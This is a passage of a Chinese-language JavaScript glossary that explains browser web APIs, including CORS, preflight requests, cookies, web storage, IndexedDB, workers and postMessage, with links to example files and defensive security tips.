**状态码**是服务器对请求结果的分类：1xx 信息（101 切换协议）、2xx 成功（200、201 创建、204 无内容）、3xx 重定向（301 永久、302/307 临时、304 未修改）、4xx 客户端错误（400 参数错、401 未认证、403 无权、404 不存在、429 太频繁）、5xx 服务端错误（500、502、503）。**Headers** 是键值元数据，请求头如 `Content-Type`、`Authorization`、`Accept`、`Cookie`、`Origin`，响应头如 `Content-Type`、`Cache-Control`、`Set-Cookie`、`Access-Control-Allow-Origin`、`Location`。关键细节：**HTTP 头不区分大小写**，`Headers` 对象提供 `get`/`set`/`has`/`append` 并会自动归一化；有些头是「禁止修改」的（由浏览器控制）；`Content-Type` 决定服务端与 `res.json()` 如何解析正文。**常见误解**：把 `fetch` 的状态码当成错误信号——非 2xx 不会 reject。

也见 [fetch（Fetch API）](#fetchfetch-api)、[CORS（跨域资源共享）](#cors跨域资源共享)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)

### Same-Origin Policy & Cross-Origin（同源策略与跨域）

**源（origin）**由「协议 + 域名 + 端口」三者组成，三者全同才算同源。**同源策略**是浏览器最重要的安全边界：不同源的脚本**不能读取对方的 DOM、不能读取对方 `fetch`/XHR 的响应内容、不能共享 localStorage/Cookie/IndexedDB**，它防的是「恶意站点借用户身份读取其它站点的数据」。**跨域**就是不同源之间的请求，它并没有被禁止（请求可以发出去），被限制的是**读取响应**。关键细节：`file://` 页面、`http` 与 `https`、`example.com` 与 `www.example.com`、`localhost:3000` 与 `:5173` 都算不同的源。**常见误解**：以为跨域是服务器的限制——它是**浏览器**施加的，因此 Postman/curl/Node 脚本不受影响。

也见 [CORS（跨域资源共享）](#cors跨域资源共享)、[Preflight Request（预检请求）](#preflight-request预检请求)、[Secure Context & file://（安全上下文与 file 协议限制）](#secure-context-file安全上下文与-file-协议限制)。

示例：[`27_web_apis/08_browser_modules.js`](27_web_apis/08_browser_modules.js)、[`32_security_and_best_practices/12_cors_and_same_origin.js`](32_security_and_best_practices/12_cors_and_same_origin.js)

### CORS（跨域资源共享）

CORS（Cross-Origin Resource Sharing，跨域资源共享）是**服务器授权浏览器放宽同源策略**的机制：服务端在响应里返回 `Access-Control-Allow-Origin`（可以是 `*` 或具体来源）等头，浏览器看到后才把响应交给 JS。常用的响应头还有 `Access-Control-Allow-Methods`、`Access-Control-Allow-Headers`、`Access-Control-Allow-Credentials`、`Access-Control-Max-Age`。关键细节：**这是浏览器的检查，不是服务器的拦截**——请求其实已经到达服务器并可能已经产生副作用，所以「靠 CORS 保护接口」是错的（要鉴权）；带 Cookie 的跨域请求不允许 `Allow-Origin: *`，必须回显具体来源。**常见误解**：以为配置了 CORS 服务器却没返回头也算通过——证书不对浏览器一律拒绝交给 JS。

也见 [Same-Origin Policy & Cross-Origin（同源策略与跨域）](#same-origin-policy-cross-origin同源策略与跨域)、[Preflight Request（预检请求）](#preflight-request预检请求)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)、[`32_security_and_best_practices/12_cors_and_same_origin.js`](32_security_and_best_practices/12_cors_and_same_origin.js)

### Preflight Request（预检请求）

预检是浏览器在发出**「非简单请求」**之前先用 `OPTIONS` 方法问一句「我能这么请求吗」的过程，服务器必须用 `Access-Control-Allow-*` 头答复，通过后浏览器才发真正的请求（`Access-Control-Max-Age` 可缓存结果，避免每次都问）。触发条件是：方法不是 `GET`/`HEAD`/`POST`，或 `Content-Type` 不是 `application/x-www-form-urlencoded`/`multipart/form-data`/`text/plain`（例如 `application/json`），或带了自定义请求头（如 `Authorization`）。关键细节：预检是**额外的一次往返**，会明显增加延迟，所以高频接口要考虑降级为简单请求或缓存 Max-Age；预检请求不带 Cookie 与正文。**常见误解**：以为「服务器没写 OPTIONS 路由就没事」——没正确响应预检，真实请求根本不会发出去。

也见 [CORS（跨域资源共享）](#cors跨域资源共享)、[Status Code & Headers（状态码与请求/响应头）](#status-code-headers状态码与请求响应头)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)

### XMLHttpRequest（历史 API）

`XMLHttpRequest`（XHR）是 `fetch` 之前的标准网络请求 API：`open(method, url)` → 设置 `onload`/`onerror`/`onprogress` → `send(body)`，通过 `readyState`（0–4）与 `status` 判断结果。它今天仍有三个不可替代的用途：**上传进度**（`upload.onprogress`）、**请求进度**（`onprogress`）以及**同步请求**（已废弃，会冻结页面，绝不要用）。与 `fetch` 的关键差异：XHR 是事件式而非 Promise 式；**非 2xx 也会触发 `onload`**（要在里面判断 `status`）；**跨域时默认不带 Cookie**（`withCredentials = true` 才带）；`fetch` 的 `Response.body` 是流而 XHR 需要 `responseType = 'blob'`/`'arraybuffer'` 之类。**常见误解**：以为 XHR 只用于老浏览器——上传进度条目前仍主要靠它。

也见 [fetch（Fetch API）](#fetchfetch-api)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)

### Cookie（Cookie）

Cookie 是服务器通过 `Set-Cookie` 响应头写在浏览器上的一小段键值数据（单个约 4KB），之后**同源的每个请求都会自动带上它**（`Cookie` 请求头），因此成为会话身份（Session ID）的标准载体。关键属性：`Expires`/`Max-Age`（不设则是会话 Cookie，关浏览器即失效）、`Domain`/`Path`（可见范围）、`Secure`（只在 HTTPS 发送）、`HttpOnly`（**JS 读不到**，防 XSS 窃取）、`SameSite`（`Strict`/`Lax`/`None`，防 CSRF）。关键细节：JS 只能通过 `document.cookie` 读写**非 HttpOnly** 的 Cookie，且 API 是拼接字符串的原始形式，非常别扭。**常见误解**：把 Cookie 当作存储方案——它每次请求都会上传，**只适合放会话标识等小数据**，大量数据应使用 Web Storage 或 IndexedDB。

也见 [localStorage（本地存储）](#localstorage本地存储)、[sessionStorage（会话存储）](#sessionstorage会话存储)、[IndexedDB（索引数据库）](#indexeddb索引数据库)。

示例：[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)

### localStorage（本地存储）

`localStorage` 是同步的键值存储，**按源隔离、永久保存**（除非用户或代码清理），同一源下的所有标签页与窗口共享同一份数据。API 极简：`setItem`/`getItem`/`removeItem`/`clear`/`key`/`length`，通过 `localStorage.key` 与 `getItem()` 访问，只能存**字符串**（对象要先 `JSON.stringify`）。关键细节：**同步 API 会阻塞主线程**，大对象读写会造成掉帧，因此不要存放大量数据；某个标签页的修改会触发**其它**标签页的 `storage` 事件（当前页不触发），可用于跨标签页同步状态。**常见误解**：以为「永久」等于「可靠」——用户清缓存、隐私模式、磁盘紧张时都可能被清掉，重要数据必须以服务器为准。

也见 [sessionStorage（会话存储）](#sessionstorage会话存储)、[Cookie（Cookie）](#cookiecookie)、[IndexedDB（索引数据库）](#indexeddb索引数据库)、[storage Event（storage 事件）](#storage-eventstorage-事件)。

示例：[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)、[`27_web_apis/05_web_storage.html`](27_web_apis/05_web_storage.html)

### sessionStorage（会话存储）

`sessionStorage` 的 API 与 `localStorage` 完全一样，差别只在**生命周期与作用范围**：数据只在**当前标签页/窗口的会话**内有效，关闭标签页即清除，并且**不跨标签页共享**（在新标签页打开同源页面会得到一份新的空存储，即使是从同一链接跳转）。关键细节：同标签页内刷新、前进后退会保留；iframe 有自己的会话存储；「复制标签页」会复制一份存储快照但从此各自独立。适用场景是**一次会话内的临时状态**：表单草稿、向导当前步骤、列表滚动位置、一次性提示是否已展示。**常见误解**：以为它和 `localStorage` 只差一个「过期时间」——作用域（每个标签页独立）往往才是它真正的价值。

也见 [localStorage（本地存储）](#localstorage本地存储)、[Cookie（Cookie）](#cookiecookie)。

示例：[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)

### IndexedDB（索引数据库）

IndexedDB 是浏览器内置的**事务型 NoSQL 数据库**，用于存放大量结构化数据（配额通常以「磁盘可用空间的百分比」计，远大于 localStorage），支持索引、游标、事务与二进制数据（可直接存 `Blob`/`ArrayBuffer`）。它的 API 是**异步事件式**的：`indexedDB.open()` → `onsuccess` 拿到数据库 → `transaction()` 开启事务 → `objectStore.put/get/openCursor` 等；现代项目通常用 Promise 包装库（如 idb）或 ORM 简化。关键细节：它按**源 + 数据库名 + 版本**隔离，升级要靠 `onupgradeneeded` 里建表与迁移；版本号是正整数，改 schema 必须升版本。**常见误解**：以为它是「大号 localStorage」——它异步、可索引、有事务，API 复杂得多，简单键值场景反而 localStorage 更省事。

也见 [localStorage（本地存储）](#localstorage本地存储)、[Quota & QuotaExceededError（配额与超限错误）](#quota-quotaexceedederror配额与超限错误)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)、[`27_web_apis/10_browser_storage_limits.html`](27_web_apis/10_browser_storage_limits.html)

### Cache Storage（缓存存储）

Cache Storage 是 `caches` 全局对象背后的存储：以「缓存名 → Request/Response 键值对」的形式保存**网络响应**，专为 Service Worker 的离线能力设计。常用方法：`caches.open(name)`、`cache.put(request, response)`、`cache.add`/`addAll`、`cache.match`/`matchAll`、`caches.delete`。关键细节：它**只在安全上下文可用**，且**只能在 Service Worker（或页面脚本配合 SW）里发挥完整作用**；它与 HTTP 缓存相互独立，浏览器调试工具的 Application 面板可以查看与清理；因为存的是 `Response` 对象，所以是**二进制友好**的，能缓存图片、字体、大文件。**常见误解**：以为 `Cache-Control` 头能限制它——Cache Storage 条目的生命周期由你的 SW 代码控制，与 HTTP 缓存策略无关。

也见 [Service Worker（服务工作线程）](#service-worker服务工作线程)、[Request & Response（请求与响应对象）](#request-response请求与响应对象)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)

### Quota & QuotaExceededError（配额与超限错误）

**配额（quota）**是浏览器允许某个源使用的存储上限，不同存储的算法与量级差别很大：Cookie 约 4KB/条且总数有限；localStorage/sessionStorage 通常每源 5–10MB；IndexedDB 与 Cache Storage 按**整个源**算，可达磁盘可用空间的很大比例（各浏览器不同，通常几十 MB 到数 GB）。超限时写入会抛出 **`QuotaExceededError`**（`DOMException`，`name === 'QuotaExceededError'`，也可能是 `NS_ERROR_DOM_QUOTA_REACHED`）。关键细节：**必须 `try/catch` 处理**，否则一次写入失败就可能中断整个流程；配额还可能被**同一源的所有标签页、IndexedDB、Cache 共同占用**。**常见误解**：以为「存进去了就一直在」——浏览器在磁盘紧张时会整体清除某个源的数据（除非申请了持久化）。

也见 [Persistent Storage（持久化存储）](#persistent-storage持久化存储)、[localStorage（本地存储）](#localstorage本地存储)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)

### Persistent Storage（持久化存储）

默认情况下，浏览器把某个源的存储视为「**best-effort（尽力而为）**」：磁盘紧张、长期未访问、隐私设置都可能把它整体清掉。**持久化存储**通过 `navigator.storage.persist()` 申请把该源提升为「persistent」，成功后浏览器承诺**只在用户主动清理时**才删除数据；`navigator.storage.persisted()` 查询当前状态，`navigator.storage.estimate()` 可以查看 `usage`（已用）与 `quota`（上限）。关键细节：授权通常在无用户手势时直接拒绝或静默批准（取决于浏览器与站点「参与度」），因此要在合适的时机申请并处理失败的降级路径。**常见误解**：以为 `persist()` 能提升配额——它改变的是「会不会被自动清除」，不是「能存多少」；而且**任何本地存储都不该是数据的唯一副本**。

也见 [Quota & QuotaExceededError（配额与超限错误）](#quota-quotaexceedederror配额与超限错误)、[Secure Context & file://（安全上下文与 file 协议限制）](#secure-context-file安全上下文与-file-协议限制)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)

### URL & URLSearchParams（URL 与查询参数）

`URL` 对象把地址拆成可读写的部件：`protocol`、`host`（含端口）、`hostname`、`port`、`pathname`、`search`、`hash`、`origin`（只读）、`username`/`password`，并**自动做百分号编码**；`URLSearchParams` 则把查询串当成可增删改查的键值集合（`get`/`getAll`/`append`/`set`/`delete`/`has`/`sort`，可迭代）。关键细节：`new URL(relative, base)` 支持相对路径解析；**永远不要用字符串拼查询参数**，中文、空格、`&`、`=` 都会出错；`url.searchParams.set('page', 2)` 会正确处理编码，还能用 `url.href` 拿回完整地址。这是**浏览器与 Node 共用的 WHATWG 标准**，写同构代码时行为一致。

也见 [node:url & URLSearchParams（URL 模块与查询参数）](#nodeurl-urlsearchparamsurl-模块与查询参数)、[history API（历史记录 API）](#history-api历史记录-api)。

示例：[`27_web_apis/06_url_and_history.js`](27_web_apis/06_url_and_history.js)、[`27_web_apis/06_url_and_history.html`](27_web_apis/06_url_and_history.html)

### history API（历史记录 API）

`history` 对象让脚本**在不刷新页面的前提下改变地址栏**：`pushState(state, '', url)` 新增一条历史记录，`replaceState` 替换当前记录，`back()`/`forward()`/`go(n)` 导航，`history.state` 读回当前记录携带的数据，`history.length` 是会话历史条目数。它支撑了现代前端路由（「pushState 路由」）。关键细节：`state` 会被**结构化克隆**（不能放函数/DOM 节点）；`pushState` **不会触发任何事件**，需要在调用处主动渲染，而用户点后退会触发 `popstate`（此时 `event.state` 有值）；用 `pushState` 造出的路径**刷新时会真的去服务器请求它**，所以服务端必须把所有前端路由都返回同一个 HTML，否则 404——这是与 hash 路由最大的工程差别。

也见 [Hash Routing（hash 路由）](#hash-routinghash-路由)、[URL & URLSearchParams（URL 与查询参数）](#url-urlsearchparamsurl-与查询参数)。

示例：[`27_web_apis/06_url_and_history.js`](27_web_apis/06_url_and_history.js)、[`27_web_apis/06_url_and_history.html`](27_web_apis/06_url_and_history.html)

### Hash Routing（hash 路由）

Hash 路由利用 URL 中 `#` 之后的部分（fragment）做前端路由：`location.hash` 变化时**不会向服务器发请求**，只触发 `hashchange` 事件，脚本据此切换视图。它的最大优点是**不需要服务器配合**——把 `index.html` 直接放静态服务器（甚至本地文件）也能正常工作，因此常见于文档站与旧式 SPA。关键细节：hash 在请求时不会发给服务器，所以**服务端拿不到路由信息**（不利于 SEO 与服务端渲染）；`#` 的内容也不参与同源判断；现代框架多默认使用 History 路由，需要服务端做 fallback 配置。**常见误解**：以为 `#` 只是「锚点」——它同样是路由状态，`location.hash = '#/users/1'` 与点击链接效果一致。

也见 [history API（历史记录 API）](#history-api历史记录-api)、[URL & URLSearchParams（URL 与查询参数）](#url-urlsearchparamsurl-与查询参数)。

示例：[`27_web_apis/06_url_and_history.js`](27_web_apis/06_url_and_history.js)

### Blob（二进制大对象）

`Blob`（Binary Large Object）表示一块**不可变的二进制数据 + MIME 类型**：`new Blob(parts, { type: 'text/plain' })`，其中 `parts` 可以是字符串、`ArrayBuffer`、TypedArray 或其它 Blob 的混合数组。它有 `size`、`type`、`slice()`（切片，可用于分片上传）、`text()`/`arrayBuffer()`/`stream()` 等读取方法。关键细节：Blob 的数据由浏览器管理（可能落在磁盘而不占 JS 堆），因此适合承载大文件；`fetch` 的响应可以用 `res.blob()` 拿到；表单与 `FormData`、`createObjectURL`、Canvas 导出都围绕它工作。**常见误解**：以为 Blob 可以像字符串一样直接读取——它是异步的，必须 `await blob.text()`。

也见 [File & FileReader（文件对象与文件读取器）](#file-filereader文件对象与文件读取器)、[Object URL & Data URL（对象 URL 与 Data URL）](#object-url-data-url对象-url-与-data-url)。

示例：[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)、[`27_web_apis/11_blob_file_formdata.html`](27_web_apis/11_blob_file_formdata.html)

### File & FileReader（文件对象与文件读取器）

`File` 是**带名字与修改时间的 `Blob` 子类**，典型来源是 `<input type="file">` 的 `files`（一个 `FileList`）或拖放事件的 `dataTransfer.files`，因此可以直接当作 `fetch` 的 `body` 或 `FormData` 的值上传。`FileReader` 是把文件内容读进内存的传统方式，事件式 API：`readAsText`/`readAsDataURL`/`readAsArrayBuffer` 配合 `onload`/`onerror`/`onprogress`（可做进度条）。关键细节：现代代码更推荐 Blob 自带的 `file.text()`/`file.arrayBuffer()`（Promise 式，还能配合 `await`），`FileReader` 主要保留用于**进度监控与老环境兼容**；文件是**只读**的，且出于安全考虑 JS **拿不到完整本地路径**（只有文件名）。

也见 [Blob（二进制大对象）](#blob二进制大对象)、[FormData（表单数据）](#formdata表单数据)、[Drag and Drop & DataTransfer（拖放与数据传递）](#drag-and-drop-datatransfer拖放与数据传递)。

示例：[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)

### Object URL & Data URL（对象 URL 与 Data URL）

两者都是「把二进制内容变成一个可用的 URL」的方案，取舍完全不同。**对象 URL（`URL.createObjectURL(blob)`）**生成一个指向内存中 Blob 的 `blob:` 伪地址，**零拷贝、几乎瞬时**，适合预览大图片/视频、触发下载，但**必须手动 `URL.revokeObjectURL()` 释放**，否则只要文档还活着就一直占内存。**Data URL（`data:image/png;base64,...`）**把内容内联进 URL 字符串，自包含、可存进数据库或 CSS，但体积膨胀约 33%、有长度限制、不能用于大文件。**常见误解**：以为对象 URL 会被垃圾回收自动清理——规范上它绑定在文档上，长期不 revoke 是典型内存泄漏来源。

也见 [Blob（二进制大对象）](#blob二进制大对象)、[Canvas（画布）](#canvas画布)。

示例：[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)、[`27_web_apis/08_browser_modules.js`](27_web_apis/08_browser_modules.js)

### Canvas（画布）

`<canvas>` 是 HTML 里的一块**位图绘制区域**，通过 `canvas.getContext('2d')` 拿到 2D 上下文后就能画图：`fillRect`/`strokeRect`/`arc`/`beginPath`/`moveTo`/`lineTo`、`fillText`、`drawImage`、渐变与阴影、`save`/`restore` 管理状态、`translate`/`rotate`/`scale` 做变换。除了 2D 还有 `webgl`/`webgl2` 用于 3D。关键细节：Canvas 是**立即模式**——没有保留的对象模型，重画必须自己清空并重绘全部内容；分辨率由 `width`/`height` **属性**（不是 CSS 尺寸）决定，要处理 `devicePixelRatio` 才清晰；导出用 `canvas.toBlob()`/`toDataURL()`；**绘制到 Canvas 的跨域图片会污染（taint）画布**，之后导出会抛安全错误。

也见 [requestAnimationFrame（动画帧回调）](#requestanimationframe动画帧回调)、[Blob（二进制大对象）](#blob二进制大对象)。

示例：[`27_web_apis/07_canvas_basics.js`](27_web_apis/07_canvas_basics.js)、[`27_web_apis/07_canvas_basics.html`](27_web_apis/07_canvas_basics.html)

### requestAnimationFrame（动画帧回调）

`requestAnimationFrame(cb)` 把回调安排到**浏览器下一次重绘之前**执行，回调收到一个高精度时间戳；它是做动画的正确方式，返回的 id 可用 `cancelAnimationFrame` 取消。相比 `setInterval`，它的优势是：**与显示器刷新率对齐**（通常 60Hz，高刷屏更高）、**页面切到后台时自动暂停**（省电、避免积压）、时间戳让你的动画逻辑基于真实时间而非帧数（不同设备速度一致）。关键细节：**`setInterval(fn, 16)` 不是帧同步**，容易掉帧与抖动；动画循环里应避免读写布局属性造成强制同步布局。**常见误解**：以为它保证「每秒 60 次」——它保证的是「每次重绘前调用一次」，卡顿时帧率会掉，所以动画要用时间差推进。

也见 [Canvas（画布）](#canvas画布)、[IntersectionObserver（交叉观察器与懒加载）](#intersectionobserver交叉观察器与懒加载)。

示例：[`27_web_apis/07_canvas_basics.js`](27_web_apis/07_canvas_basics.js)、[`31_performance_and_memory/14_long_tasks_and_scheduling.js`](31_performance_and_memory/14_long_tasks_and_scheduling.js)

### IntersectionObserver（交叉观察器与懒加载）

`IntersectionObserver` 异步观察「**目标元素与视口（或某个根容器）是否相交**」，交叉比例变化时触发回调，条目里带 `isIntersecting`、`intersectionRatio`、`boundingClientRect`、`target`。它取代了「监听 `scroll` + `getBoundingClientRect()`」的旧做法：**不阻塞主线程、不需要在滚动回调里强制读布局**，因此不引起卡顿。典型用途：**图片/组件懒加载**（进入视口附近才加载，配 `rootMargin: '200px'` 提前触发）、**无限滚动**（底部哨兵元素进入视口就请求下一页）、曝光埋点、动画触发。关键细节：回调只在**跨越阈值**时触发，不是每帧都触发；用完记得 `disconnect()`。

也见 [MutationObserver & ResizeObserver（变动与尺寸观察器）](#mutationobserver-resizeobserver变动与尺寸观察器)、[requestAnimationFrame（动画帧回调）](#requestanimationframe动画帧回调)。

示例：[`27_web_apis/12_observer_apis.js`](27_web_apis/12_observer_apis.js)、[`27_web_apis/12_observer_apis.html`](27_web_apis/12_observer_apis.html)

### MutationObserver & ResizeObserver（变动与尺寸观察器）

`MutationObserver` 观察 **DOM 结构变化**（子节点增删、属性变化、文本变化），回调收到的 `MutationRecord` 列表描述「发生了什么」，`observe(target, { childList: true, subtree: true, attributes: true })` 配置观察范围——它是已废弃的 `Mutation Events` 的替代品，且回调在**微任务**里批量投递，不会打断当前操作。`ResizeObserver` 观察**元素的尺寸变化**（`contentRect`），用来替代 `window.onresize` 与「定时轮询尺寸」的旧方案，常用于容器自适应图表、虚拟列表重算。关键细节：**两者都在回调阶段读尺寸/结构，天然避免了强制同步布局**；`ResizeObserver` 回调里如果又改了被观察元素的尺寸，会触发 `ResizeObserver loop` 告警，需要避免自我触发的循环。

也见 [IntersectionObserver（交叉观察器与懒加载）](#intersectionobserver交叉观察器与懒加载)、[DOM Manipulation & DocumentFragment（DOM 操作与文档片段）](#dom-manipulation-documentfragmentdom-操作与文档片段)。

示例：[`27_web_apis/12_observer_apis.js`](27_web_apis/12_observer_apis.js)

### postMessage（跨上下文消息）

`postMessage` 是**跨上下文安全通信**的标准通道：窗口 ↔ iframe、窗口 ↔ 弹窗、页面 ↔ Web Worker ↔ Service Worker 之间都用它。发送方 `target.postMessage(message, targetOrigin)`，接收方 `addEventListener('message', e => e.data)` 并检查 `e.origin`/`e.source`。关键细节：消息内容经过**结构化克隆**（函数、DOM 节点、原型链会丢失或直接报错），因此不能传「行为」，只能传「数据」；**第二个参数 `targetOrigin` 绝不要写成 `'*'`**，否则消息可能被恶意页面截获，接收端**必须校验 `event.origin`**，这是常见的 XSS/数据泄露入口。**常见误解**：以为同源才能用——恰恰相反，它是跨源页面之间唯一被允许的通信方式。

也见 [BroadcastChannel（广播频道）](#broadcastchannel广播频道)、[Structured Clone（结构化克隆）](#structured-clone结构化克隆)、[Web Worker（浏览器端工作线程）](#web-worker浏览器端工作线程)。

示例：[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)、[`27_web_apis/13_cross_context_messaging.html`](27_web_apis/13_cross_context_messaging.html)

### BroadcastChannel（广播频道）

`BroadcastChannel` 让**同一源下的所有浏览上下文**（标签页、iframe、Worker）通过一个命名频道互相广播消息：`new BroadcastChannel('sync')` → `postMessage(data)` → 其它上下文触发 `onmessage`，`close()` 关闭。它比 `postMessage` 更简单——**不需要持有对方窗口的引用**，只要源相同、频道名相同就能收到，因此非常适合「多标签页状态同步」（登录/登出、主题切换、数据刷新、防止同一操作重复提交）。关键细节：消息同样走**结构化克隆**；**发送者自己不会收到自己发的消息**（这常常需要自己额外处理本地更新）；频道不跨源、也不跨浏览器。**常见误解**：以为它能替代服务器——它只在同一浏览器内传播，不同设备之间必须靠服务端（WebSocket/SSE）。

也见 [postMessage（跨上下文消息）](#postmessage跨上下文消息)、[storage Event（storage 事件）](#storage-eventstorage-事件)。

示例：[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)

### storage Event（storage 事件）

`window.addEventListener('storage', handler)` 监听的是「**其它同源上下文**修改了 localStorage/sessionStorage」这件事，事件对象的 `key`/`newValue`/`oldValue`/`url`/`storageArea` 描述改动内容。它的价值在于**零依赖实现跨标签页同步**（例如一个标签页退出登录，其它标签页立刻清空本地状态）。关键细节：**触发修改的那个标签页自己不会收到事件**（所以本地状态要单独更新）；`clear()` 会以 `key === null` 触发；`sessionStorage` 因为不跨标签页共享，实际上几乎用不到这个事件；另外它对**同一次改动只触发一次**，不会为每个 key 各来一次。

也见 [BroadcastChannel（广播频道）](#broadcastchannel广播频道)、[localStorage（本地存储）](#localstorage本地存储)。

示例：[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)、[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)

### Structured Clone（结构化克隆）

结构化克隆是浏览器与 Node 在**跨上下文传递数据**（`postMessage`、`history.pushState`、IndexedDB 存储、`MessageChannel`）时使用的序列化算法。它能处理对象与数组（含嵌套）、`Date`、`RegExp`、`Map`/`Set`、`ArrayBuffer`/TypedArray、`Blob`/`File`、`Error` 的常见类型，并且**正确保留循环引用**。它**不能**克隆：函数、DOM 节点、类实例的原型链（变成普通对象）、`Symbol`、属性描述符与 getter/setter。关键细节：`structuredClone(value)` 全局函数可以主动做一次深拷贝，是「比 `JSON.parse(JSON.stringify(x))` 更正确」的深拷贝方案。**常见误解**：以为传过去的是同一个对象——克隆就是**深拷贝**，改动副本不会影响原件（想共享内存必须用 `SharedArrayBuffer`）。

也见 [postMessage（跨上下文消息）](#postmessage跨上下文消息)、[SharedArrayBuffer（共享内存缓冲区）](#sharedarraybuffer共享内存缓冲区)，以及类型册的 [`24_typed_arrays/11_blob_and_binary_interop.js`](24_typed_arrays/11_blob_and_binary_interop.js)。

示例：[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)、[`27_web_apis/14_drag_drop_and_clipboard.js`](27_web_apis/14_drag_drop_and_clipboard.js)

### Drag and Drop & DataTransfer（拖放与数据传递）

HTML5 拖放基于一组事件：`dragstart`（在被拖元素上触发，此处必须调用 `dataTransfer.setData()` 才能启动拖拽）、`dragenter`/`dragover`（在放置目标上持续触发，**必须 `preventDefault()` 才会变成可放置**）、`drop`（读取 `dataTransfer.getData()`/`files`）、`dragend`，以及 `dragleave`。`dataTransfer` 是事件对象的属性，承载被拖数据与 `dropEffect`（复制/移动）、`effectAllowed`，并负责在页面之间传递文件（`dataTransfer.files`）。关键细节：拖拽过程中 `dataTransfer` 的数据**只能在 `drop` 时读取**（`dragstart` 之外读不到，是防跨站探测的安全设计）；支持自定义拖拽图像 `setDragImage`；移动端浏览器对 HTML5 拖放支持有限，常改用指针事件。

也见 [File & FileReader（文件对象与文件读取器）](#file-filereader文件对象与文件读取器)、[Clipboard API & User Gesture（剪贴板与用户手势）](#clipboard-api-user-gesture剪贴板与用户手势)。

示例：[`27_web_apis/14_drag_drop_and_clipboard.js`](27_web_apis/14_drag_drop_and_clipboard.js)、[`27_web_apis/14_drag_drop_and_clipboard.html`](27_web_apis/14_drag_drop_and_clipboard.html)

### Clipboard API & User Gesture（剪贴板与用户手势）

现代剪贴板 API 是 `navigator.clipboard`：`writeText`/`readText` 读写纯文本，`write`/`read` 用 `ClipboardItem` 处理 `text/html`、`image/png` 等富类型，全部返回 Promise。关键限制是**用户手势要求（user gesture）**：读写剪贴板必须在用户交互（点击、按键）触发的调用栈里发起，否则浏览器会拒绝（Permission denied）——粘贴读取的保护更严，通常还需用户授权。关键细节：`navigator.clipboard` **只在安全上下文（HTTPS/localhost）可用**，`file://` 与 `http://` 页面下它是 `undefined`，旧式 `document.execCommand('copy')` 因此仍作为降级方案保留；页面失焦（切到别的应用）时读写也会失败。

也见 [Secure Context & file://（安全上下文与 file 协议限制）](#secure-context-file安全上下文与-file-协议限制)、[Drag and Drop & DataTransfer（拖放与数据传递）](#drag-and-drop-datatransfer拖放与数据传递)。

示例：[`27_web_apis/14_drag_drop_and_clipboard.js`](27_web_apis/14_drag_drop_and_clipboard.js)

### Web Worker（浏览器端工作线程）

Web Worker 让页面拥有**额外的后台线程**，在主线程之外执行 JS，从而把耗时计算从渲染路径上挪开：`new Worker(url, { type: 'module' })` 创建，双向通过 `postMessage`/`onmessage` 通信（数据走结构化克隆），`worker.terminate()` 结束。限制非常明确：**Worker 里没有 `document`、没有 DOM，也没有 `window`**，只能访问 `self`、`fetch`、`IndexedDB`、`caches`、`WebSocket` 等；不能直接操作页面元素，只能把结果发回主线程渲染。关键细节：创建 Worker 需要**独立的脚本文件 URL**（不能直接传函数），跨源脚本需 CORS 允许；可用 `SharedArrayBuffer` 做到零拷贝共享内存，但需要跨源隔离（COOP/COEP）。**常见误解**：以为 Worker 能加速一切——通信本身有序列化成本，小任务反而更慢。

也见 [Worker Threads & Main Thread（工作线程与主线程）](#worker-threads-main-thread工作线程与主线程)、[postMessage（跨上下文消息）](#postmessage跨上下文消息)、[Service Worker（服务工作线程）](#service-worker服务工作线程)。

示例：[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)、[`27_web_apis/09_dom_performance.js`](27_web_apis/09_dom_performance.js)

### Service Worker（服务工作线程）

Service Worker 是**运行在页面之外、可拦截网络请求**的特殊 Worker，本质是一个「可编程的网络代理」：注册后可以拦截同源（作用域内）的 `fetch` 事件、从 Cache Storage 返回离线内容、做后台同步与推送通知。生命周期与普通 Worker 完全不同：`navigator.serviceWorker.register('/sw.js')` → 安装 `install` → 等待 `waiting` → 激活 `activate`，之后在**没有页面打开时也可能被唤醒或终止**，因此**不能依赖全局变量保存状态**。关键限制：**只在安全上下文可用**，作用域受脚本路径限制（`/sw.js` 才能控制整个站点），升级时要处理缓存版本与 `skipWaiting`/`clients.claim` 的更新时机。**常见误解**：以为它常驻内存——它是事件驱动的，随时会被浏览器回收。

也见 [Cache Storage（缓存存储）](#cache-storage缓存存储)、[Secure Context & file://（安全上下文与 file 协议限制）](#secure-context-file安全上下文与-file-协议限制)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)、[`27_web_apis/13_cross_context_messaging.js`](27_web_apis/13_cross_context_messaging.js)

### Secure Context & file://（安全上下文与 file 协议限制）

